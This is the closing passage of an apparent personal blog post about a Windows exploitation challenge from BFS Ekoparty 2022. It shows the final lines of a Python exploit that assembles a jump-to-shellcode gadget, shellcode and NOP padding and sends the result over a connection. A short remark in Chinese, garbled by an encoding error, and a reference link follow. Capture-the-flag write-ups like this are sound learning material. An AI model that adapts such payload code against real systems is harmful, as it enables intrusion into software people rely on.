</span></span><span style="display:flex;"><span>data <span style="color:#ff79c6">=</span> ctx
</span></span><span style="display:flex;"><span>data <span style="color:#ff79c6">+=</span> jmp_shellcode <span style="color:#ff79c6">+</span> origin_rsp
</span></span><span style="display:flex;"><span>data <span style="color:#ff79c6">+=</span> shellcode
</span></span><span style="display:flex;"><span>data <span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\x90</span><span style="color:#f1fa8c">&#34;</span> <span style="color:#ff79c6">*</span> (<span style="color:#bd93f9">0xF00</span> <span style="color:#ff79c6">-</span> <span style="color:#8be9fd;font-style:italic">len</span>(data))
</span></span><span style="display:flex;"><span>data <span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;X&#34;</span> <span style="color:#ff79c6">+</span> padding
</span></span><span style="display:flex;"><span>conn<span style="color:#ff79c6">.</span>send(header <span style="color:#ff79c6">+</span> data)
</span></span></code></pre></div><p>ç¬¬ä¸€æ¬¡æ¥è§¦åˆ°æ®µå¯„å­˜å™¨è¿™ç§ç©æ³•ï¼Œç‹ ç‹ çš„å­¦ä¹ äº†ğŸ˜¤</p>
<h2 id="å‚è€ƒ">å‚è€ƒ</h2>
<ul>
<li><a href="https://infosecwriteups.com/bfs-ekoparty-2022-exploitation-challenges-7deffce64ee4">BFS Ekoparty 2022 Exploitation Challenges</a></li>
</ul>
		</section>

		<div class="post-tags">
			
			
			<nav class="nav tags">
				<ul class="tags">
					
					<li><a href="/tags/windows">Windows</a></li>
					
				</ul>
			</nav>
			
			
		</div>
		<div id="disqus_thread"></div>
<script type="text/javascript">
    (function () {
        
        
        if (window.location.hostname == "localhost")
            return;

        var dsq = document.createElement('script');
        dsq.type = 'text/javascript';
        dsq.async = true;
        var disqus_shortname = 'ldrx30';
        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    })();
</script>

</article>
</main>
<footer>
  <div style="display:flex"><a class="soc" href="https://github.com/ldrx30" rel="me" title="GitHub"><i data-feather="github"></i></a>
    <a class="border"></a></div>
  <div class="footer-info">
    2024  Â© ldrx30 |  <a
      href="https://github.com/athul/archie">Archie Theme</a> | Built with <a href="https://gohugo.io">Hugo</a>
  </div>
</footer>
<script>
  feather.replace()
</script></div>
    </body>
</html>
